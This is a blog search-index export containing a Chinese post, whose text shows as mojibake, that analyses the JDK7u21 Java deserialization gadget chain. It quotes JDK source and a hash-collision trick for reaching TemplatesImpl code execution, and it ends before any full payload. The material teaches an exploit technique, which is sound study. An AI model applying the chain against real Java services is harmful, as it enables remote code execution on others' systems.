<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JAVA-åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨é“¾JDK7u21</title>
      <link href="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/"/>
      <url>/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/</url>
      
        <content type="html"><![CDATA[<h1 id="è¯´ä¸¤å¥"><a href="#è¯´ä¸¤å¥" class="headerlink" title="è¯´ä¸¤å¥"></a>è¯´ä¸¤å¥</h1><p>åœ¨å‰é¢çš„åˆ†æåˆ©ç”¨é“¾ä¸­ï¼Œå¤§éƒ¨åˆ†éƒ½åŸºäº InvokerTransformer å’Œ TemplatesImpl è¿™ä¸¤ä¸ªç±»å»æ‰§è¡Œå‘½ä»¤ï¼Œè€Œå…¶ä»–çš„ä¸€äº›åˆ©ç”¨é“¾ä¹Ÿæ˜¯ç»è¿‡è¿™ä¸¤ä¸ªç±»å»è¿›è¡Œå˜å½¢ï¼Œä»è€Œäº§ç”Ÿæ–°çš„åˆ©ç”¨é“¾ï¼Œè€Œåœ¨Jdk7u21ä¸­ï¼Œä¹Ÿæ˜¯åŸºäº TemplatesImpl å»å®ç°çš„ï¼Œå¦ä¸€ä¸ªæ ¸å¿ƒç‚¹å°±æ˜¯ </p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ è¿™ä¸ªè€æœ‹å‹AnnotationInvocationHandlerç±»ä¸­çš„equalsImplæ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">private Boolean equalsImpl(Object var1) &#123;  </span><br><span class="line">    if (var1 == this) &#123;  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125; else if (!this.type.isInstance(var1)) &#123;  </span><br><span class="line">        return false;  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        Method[] var2 = this.getMemberMethods();  </span><br><span class="line">        int var3 = var2.length;  </span><br><span class="line">  </span><br><span class="line">        for(int var4 = 0; var4 &lt; var3; ++var4) &#123;  </span><br><span class="line">            Method var5 = var2[var4];  </span><br><span class="line">            String var6 = var5.getName();  </span><br><span class="line">            Object var7 = this.memberValues.get(var6);  </span><br><span class="line">            Object var8 = null;  </span><br><span class="line">            AnnotationInvocationHandler var9 = this.asOneOfUs(var1);  </span><br><span class="line">            if (var9 != null) &#123;  </span><br><span class="line">                var8 = var9.memberValues.get(var6);  </span><br><span class="line">            &#125; else &#123;  </span><br><span class="line">                try &#123;  </span><br><span class="line">                    var8 = var5.invoke(var1);  </span><br><span class="line">                &#125; catch (InvocationTargetException var11) &#123;  </span><br><span class="line">                    return false;  </span><br><span class="line">                &#125; catch (IllegalAccessException var12) &#123;  </span><br><span class="line">                    throw new AssertionError(var12);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            if (!memberValueEquals(var7, var8)) &#123;  </span><br><span class="line">                return false;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> /**/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹equalsImpl()  æ–¹æ³•<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/1.jpg"></p><p>è·Ÿè¿›è¿™ä¸ª  getMemberMethods() æ–¹æ³•ï¼Œå¯ä»¥çŸ¥é“ è¿™æ˜¯éå† this.type è¿™ä¸ªå¯¹è±¡çš„æ‰€æœ‰æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private Method[] getMemberMethods() &#123;  </span><br><span class="line">    if (this.memberMethods == null) &#123;  </span><br><span class="line">        this.memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() &#123;  </span><br><span class="line">            public Method[] run() &#123;  </span><br><span class="line">                Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();  </span><br><span class="line">                AccessibleObject.setAccessible(var1, true);  </span><br><span class="line">                return var1;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    return this.memberMethods;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼ŒequalsImpl()  è¿™ä¸ªæ–¹æ³•æ˜¯å°† this.type ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•éƒ½éå†æ‰§è¡Œäº†ï¼Œé‚£ä¹ˆï¼Œå‡è®¾ this.type æ˜¯Templates ç±»ï¼Œé‚£ä¹ˆä¸€å®šä¼šè°ƒç”¨åˆ° å…¶ä¸­çš„  newTransformer() æˆ–è€… getOutputProperties() æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘ä»»æ„ä»£ç æ‰§è¡Œ  ï¼Œ è¿™å°±æ˜¯JDK7u21 çš„æ ¸å¿ƒåŸç†~</p><h1 id="å¯»æ‰¾-equalsImpl-è°ƒç”¨é“¾"><a href="#å¯»æ‰¾-equalsImpl-è°ƒç”¨é“¾" class="headerlink" title="å¯»æ‰¾ equalsImpl è°ƒç”¨é“¾"></a>å¯»æ‰¾ equalsImpl è°ƒç”¨é“¾</h1><p>æˆ‘ä»¬ç°åœ¨çš„ç›®æ ‡å°±æ˜¯ä¸ºäº†è°ƒç”¨è¿™ä¸ª equalsimpl ï¼Œè€Œ equalsimpl æ˜¯ä¸€ä¸ª  private ç§æœ‰æ–¹æ³•ï¼Œåœ¨ AnnotationInvocationHandler#invoke ä¸­è¢«è°ƒç”¨ã€‚<br><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/2.jpg"></p><p>AnnotationInvocationHandler æ˜¯ ä¸€ä¸ªInvocationHandler æ¥å£çš„å®ç°ï¼Œ InvocationHandleræ˜¯ä¸€ä¸ªæ¥å£ï¼Œä»–åªæœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯invokeï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    public Object invoke(Object proxy, Method method, Object[] args)  </span><br><span class="line">        throws Throwable;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä½¿ç”¨ java.reflect.Proxy åŠ¨æ€ç»‘å®šä¸€ä¸ªæ¥å£æ—¶ï¼Œå¦‚æœè°ƒç”¨è¯¥æ¥å£ä¸­ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œä¼šæ‰§è¡Œåˆ° InvocationHandler#invoke ã€‚æ‰§è¡Œinvokeæ—¶ï¼Œè¢«ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¿™ä¸ªproxyå¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ è¢«æ‰§è¡Œçš„æ–¹æ³•åï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ‰§è¡Œæ—¶çš„å‚æ•°åˆ—è¡¨ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹çœ‹ AnnotationInvocationHandler#invoke</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;  </span><br><span class="line">    String var4 = var2.getName();  </span><br><span class="line">    Class[] var5 = var2.getParameterTypes();  </span><br><span class="line">    if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;  </span><br><span class="line">        return this.equalsImpl(var3[0]);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        assert var5.length == 0;  </span><br><span class="line">  </span><br><span class="line">        if (var4.equals(&quot;toString&quot;)) &#123;  </span><br><span class="line">            return this.toStringImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">            return this.hashCodeImpl();  </span><br><span class="line">        &#125; else if (var4.equals(&quot;annotationType&quot;)) &#123;  </span><br><span class="line">            return this.type;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.................</span><br></pre></td></tr></table></figure><p>å¦‚æœ ä¼ å…¥çš„æ–¹æ³•å ä¸º  â€œequalsâ€  ä¸”æ–¹æ³•ä»…æœ‰ä¸€ä¸ªç±»å‹å‚æ•°æ—¶ï¼Œå°±ä¼šè°ƒç”¨ equalsImpl()</p><p>æ‰€ä»¥æˆ‘ä»¬è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œ ååºåˆ—åŒ–æ—¶ å¯¹proxy è°ƒç”¨ equals æ–¹æ³•</p><h1 id="æ‰¾åˆ°equals-è°ƒç”¨é“¾"><a href="#æ‰¾åˆ°equals-è°ƒç”¨é“¾" class="headerlink" title="æ‰¾åˆ°equals è°ƒç”¨é“¾"></a>æ‰¾åˆ°equals è°ƒç”¨é“¾</h1><p>åœ¨ä¸Šç¯‡æˆ‘ä»¬é‡åˆ°ï¼Œå’Œequals ç±»ä¼¼çš„ ç”¨æ³•æœ‰å¦ä¸€ä¸ªæ–¹æ³•ï¼Œ <code>CompareTo</code>  ä»–é€šå¸¸è¢«å®ç°ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å€¼æ˜¯æ˜¯å¦ç›¸ç­‰ï¼Œä½†ä»–ç”¨çš„ compareTo æ–¹æ³•ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„ equalsï¼Œå¦ä¸€ä¸ªå¸¸è§çš„ä¼šè°ƒç”¨ equals çš„åœºæ™¯å°±æ˜¯ é›†åˆSet ï¼ŒSet ä¸­å‚¨å­˜çš„ å¯¹è±¡ä¸å…è®¸é‡å¤ï¼Œæ‰€ä»¥åœ¨æ·»åŠ å¯¹è±¡æ—¶ï¼Œä¸€å®šä¼šè§¦ç¢°åˆ°å¯¹æ¯”çš„æ“ä½œ ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ HashSet çš„ReadObject æ–¹æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)  </span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;  </span><br><span class="line">        // Read in any hidden serialization magic  </span><br><span class="line">        s.defaultReadObject();  </span><br><span class="line">  </span><br><span class="line">        // Read in HashMap capacity and load factor and create backing HashMap  </span><br><span class="line">        int capacity = s.readInt();  </span><br><span class="line">        float loadFactor = s.readFloat();  </span><br><span class="line">        map = (((HashSet)this) instanceof LinkedHashSet ?  </span><br><span class="line">               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :  </span><br><span class="line">               new HashMap&lt;E,Object&gt;(capacity, loadFactor));  </span><br><span class="line">  </span><br><span class="line">        // Read in size  </span><br><span class="line">        int size = s.readInt();  </span><br><span class="line">  </span><br><span class="line">        // Read in all elements in the proper order.  </span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;  </span><br><span class="line">            E e = (E) s.readObject();  </span><br><span class="line">            map.put(e, PRESENT);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>map</code>ä¹Ÿæ˜¯ç¬æ€å±æ€§ã€‚è¿™é‡Œå¾—åˆ°çš„å¾ˆæ˜æ˜¾æ˜¯<code>HashMap</code>ï¼Œç„¶åä¾æ¬¡ä»<code>s.readObject()</code>é‡Œé¢è¯»å–keyï¼Œç„¶åè°ƒç”¨<code>map.put</code>æ–¹æ³•æ”¾è¿›å»ï¼Œå› ä¸ºä¹Ÿè¯´äº†ï¼Œ<code>HashSet</code>çš„åº•å±‚å®ç°è¿˜æ˜¯<code>HashMap</code>ï¼Œ è¿˜è¦è¯´ä¸€ç‚¹ï¼Œ å“ˆå¸Œè¡¨å…¶å®æ˜¯ç”± æ•°ç»„ + é“¾è¡¨å®ç°çš„ï¼Œ å“ˆå¸Œè¡¨ åº•å±‚ ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ•°ç»„çš„ç´¢å¼•æ˜¯ç”±å“ˆå¸Œè¡¨çš„é”®çš„hashå€¼è®¡ç®—å¾—åˆ°çš„ ï¼Œä¹Ÿå°±æ˜¯ key.hashcode() , æ•°ç»„çš„å€¼æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œæ‰€æœ‰hashç¢°æ’åˆ°ç›¸åŒç´¢å¼•çš„key-valueï¼Œéƒ½ä¼šè¢«é“¾æ¥åˆ° é“¾è¡¨åé¢ ï¼Œè¿™é‡Œå€Ÿç”¨ pç‰›çš„ä¸€å¼ å›¾ </p><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/3.jpg"></p><p>æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„ put æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;  </span><br><span class="line">    if (key == null)  </span><br><span class="line">        return putForNullKey(value);  </span><br><span class="line">    int hash = hash(key);  </span><br><span class="line">    int i = indexFor(hash, table.length);  </span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;  </span><br><span class="line">        Object k;  </span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;  </span><br><span class="line">            V oldValue = e.value;  </span><br><span class="line">            e.value = value;  </span><br><span class="line">            e.recordAccess(this);  </span><br><span class="line">            return oldValue;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç° å¯¹æ”¾å…¥çš„ keyè¿›è¡Œäº† hashï¼Œçœ‹è§è¿™é‡Œçš„  if æ–¹æ³•å†…ï¼Œå¦‚æœå½“å‰çš„map ä¸­ æœ‰hashå€¼ç›¸åŒçš„keyï¼Œå°±ä¼š key.equals(k) å¦‚æœ key æ˜¯ä»£ç†å¯¹è±¡ï¼Œk ä¸ºTemplatesImpl ï¼Œåˆ™æ­¤æ—¶ä¼šè°ƒç”¨  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke-&gt;AnnotationInvocationHandler.equalsImpl-&gt;TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><p>ä»è€Œæ‰§è¡Œå‘½ä»¤ï¼Œ æ‰€ä»¥æˆ‘è§‰å¾—ï¼Œèƒ½æ‰¾åˆ°è¿™æ¡é“¾å­çš„å¸ˆå‚…å®åœ¨æ˜¯å®åŠ›å¼ºğŸ‘</p><p>è®¡ç®—  â€œå“ˆå¸Œâ€ çš„ä¸»è¦æ˜¯ä¸‹é¢è¿™ä¸¤è¡Œä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int hash = hash(key);  </span><br><span class="line">int i = indexFor(hash, table.length);</span><br></pre></td></tr></table></figure><p>è·Ÿè¿› hash()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">final int hash(Object k) &#123;  </span><br><span class="line">    int h = 0;</span><br><span class="line">h ^= k.hashCode();  </span><br><span class="line">  </span><br><span class="line">h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);  </span><br><span class="line">    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é™¤äº† è°ƒç”¨hashCode å¤–ï¼Œæ²¡æœ‰å…¶ä»–çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ proxy å¯¹è±¡ ä¸TemplateImpl   æ˜¯å¦ç›¸ç­‰ï¼Œå–å†³äºè¿™ä¸¤ä¸ªå¯¹è±¡çš„ hashcode() æ˜¯å¦ç›¸ç­‰ã€‚é‚£æˆ‘ä»¬å°±æ¥çœ‹çœ‹è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œé¦–å…ˆæ˜¯ TemplatesImpl çš„hashcode æ–¹æ³•ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        TemplatesImpl templates2 = new TemplatesImpl();  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+templates.hashCode());  </span><br><span class="line">        System.out.println(&quot;temp2:&quot;+ templates2.hashCode());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/20/JAVA-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BEJDK7u21/4.jpg"></p><p>å‘ç°ä»–æ¯æ¬¡ çš„hashCode åçš„å€¼éƒ½ä¸å”¯ä¸€ï¼ŒDebug ä¹Ÿæ— æ³•è·Ÿè¸ªè°ƒè¯•ï¼Œè€Œæ˜¯ç›´æ¥æ‰“å°äº†å…¶hashå€¼ï¼Œç½‘ä¸Šè¯´æ˜¯ Native æ–¹æ³• ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯Nativeæ–¹æ³•ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">native æ˜¯ç”¨åšjava å’Œå…¶ä»–è¯­è¨€ï¼ˆå¦‚c++ï¼‰è¿›è¡Œåä½œæ—¶ä½¿ç”¨çš„ï¼Œä¹Ÿå°±æ˜¯native åçš„å‡½æ•°çš„å®ç°ä¸æ˜¯ç”¨javaå†™çš„ã€‚  </span><br><span class="line">æ—¢ç„¶éƒ½ä¸æ˜¯javaï¼Œé‚£å°±åˆ«ç®¡å®ƒçš„æºä»£ç äº†ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“è¿™ä¸ªæ–¹æ³•å·²ç»è¢«å®ç°å³å¯ã€‚  </span><br><span class="line">nativeçš„æ„æ€å°±æ˜¯é€šçŸ¥æ“ä½œç³»ç»Ÿï¼Œ è¿™ä¸ªå‡½æ•°ä½ å¿…é¡»ç»™æˆ‘å®ç°ï¼Œå› ä¸ºæˆ‘è¦ä½¿ç”¨ã€‚ æ‰€ä»¥nativeå…³é”®å­—çš„å‡½æ•°éƒ½æ˜¯æ“ä½œç³»ç»Ÿå®ç°çš„ï¼Œ javaåªèƒ½è°ƒç”¨ã€‚  </span><br><span class="line">javaæ˜¯è·¨å¹³å°çš„è¯­è¨€ï¼Œæ—¢ç„¶æ˜¯è·¨äº†å¹³å°ï¼Œæ‰€ä»˜å‡ºçš„ä»£ä»·å°±æ˜¯ç‰ºç‰²ä¸€äº›å¯¹åº•å±‚çš„æ§åˆ¶ï¼Œè€Œjavaè¦å®ç°å¯¹åº•å±‚çš„æ§åˆ¶ï¼Œå°±éœ€è¦ä¸€äº›å…¶ä»–è¯­è¨€çš„å¸®åŠ©ï¼Œè¿™ä¸ªå°±æ˜¯nativeçš„ä½œç”¨äº†ã€‚</span><br></pre></td></tr></table></figure><p>è™½ç„¶å¦‚æ­¤ï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œ æ¯æ¬¡è¿è¡Œ å…¶hash éƒ½åœ¨æ”¹å˜ï¼Œæ‰€ä»¥æƒ³è®© proxy çš„hashCode ä¸å…¶ç›¸ç­‰ï¼Œåªèƒ½å¯„å¸Œæœ›äº proxy.hashCode() â€¦.</p><p>å†æƒ³æƒ³ä»£ç†å¯¹è±¡çš„hashCode æ–¹æ³•ï¼Œæ—¢ç„¶æ˜¯ä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨å…¶ hashCode() å¾ˆæ˜æ˜¾ä¼šè°ƒç”¨åˆ° AnnotationInvocationHandler#invoke è¿›è€Œè°ƒç”¨åˆ° AnnotationInvocationHandler#hashCodeImplï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#125; else if (var4.equals(&quot;hashCode&quot;)) &#123;  </span><br><span class="line">    return this.hashCodeImpl();</span><br></pre></td></tr></table></figure><p>è¿›å…¥æ­¤æ–¹æ³• çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private int hashCodeImpl() &#123; </span><br><span class="line">int result = 0; </span><br><span class="line">for (Map.Entry e : memberValues.entrySet()) &#123; </span><br><span class="line">result += (127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue()); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">return result; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯éå†è¿™ä¸ª memberValuesè¿™ä¸ªMap ï¼ŒæŠŠæ¯æ¬¡è®¡ç®—å‡ºæ¥çš„  127*(keyçš„hash)^(valueçš„hash)  </p><p>å¼€å‘å‡ºè¿™é“¾å­çš„ä½œè€…å¾ˆç‰›é€¼ï¼Œä»–æƒ³åˆ°è®©è¿™ä¸ª memberValuesè¿™ä¸ªMap åªæœ‰ä¸€ä¸ªé”®å€¼å¯¹ï¼Œè®©key çš„hashä¸º 0  ï¼Œè¿™æ · 127*0 &#x3D; 0  ï¼Œç„¶å0 ^ xxx ä»ç„¶æ˜¯xxx (ç›¸åŒä¸º0  ï¼Œä¸åŒä¸º1)ï¼Œå†è®©value æ˜¯æ¶æ„çš„ TemplatesImplå¯¹è±¡ï¼Œè¿™æ ·è®¡ç®—çš„å°±æ˜¯é‚£ä¸ª <code>TemplatesImpl</code>å¯¹è±¡çš„hashå€¼ è‡ªç„¶å°± ä¸¤ä¸ªhash ç›¸ç­‰äº†ã€‚</p><p>ä¸å¾—ä¸è¯´ nbbbbbbb</p><p>æ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ª hashCode æ˜¯ 0 çš„å¯¹è±¡ä½œä¸º memberValues çš„keyï¼Œå°†æ¶æ„TemplateImplå¯¹è±¡ä½œä¸º valueï¼Œè¿™ä¸ªproxyè®¡ç®—çš„hashCodeå°±ä¸TemplateImplå¯¹è±¡æœ¬èº«çš„hashCodeç›¸ç­‰äº†ã€‚</p><p>æ‰¾ä¸€ä¸ªhashCode æ˜¯ 0 çš„å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class Test7u21 &#123;  </span><br><span class="line">    public static void main(String[] args) &#123;  </span><br><span class="line">        for (long i = 0; i &lt; 9999999999L; i++) &#123;  </span><br><span class="line">            if (Long.toHexString(i).hashCode() == 0)&#123;  </span><br><span class="line">                System.out.println(Long.toHexString(i));  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è„šæœ¬è·‘å‡ºæ¥çš„æ˜¯ f5a5a608 </p><h1 id="åˆ©ç”¨é“¾æ•´ç†"><a href="#åˆ©ç”¨é“¾æ•´ç†" class="headerlink" title="åˆ©ç”¨é“¾æ•´ç†"></a>åˆ©ç”¨é“¾æ•´ç†</h1><p>è¯´äº†è¿™ä¹ˆå¤šï¼Œæƒ³å¿…è„‘å­ä¹Ÿæ˜æ˜çš„äº†ï¼Œè¿™é‡Œå°±æ•´ç†ä¸€ä¸‹è¿‡ç¨‹</p><ul><li>é¦–å…ˆ ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯ ç”Ÿæˆ TemplateImpl æ¶æ„å¯¹è±¡</li><li>å®ä¾‹åŒ– AnnotationInvocationHandlerå¯¹è±¡ <ul><li>ä»–çš„typeå±æ€§æ˜¯ä¸€ä¸ª TemplateImpl ç±»(å› 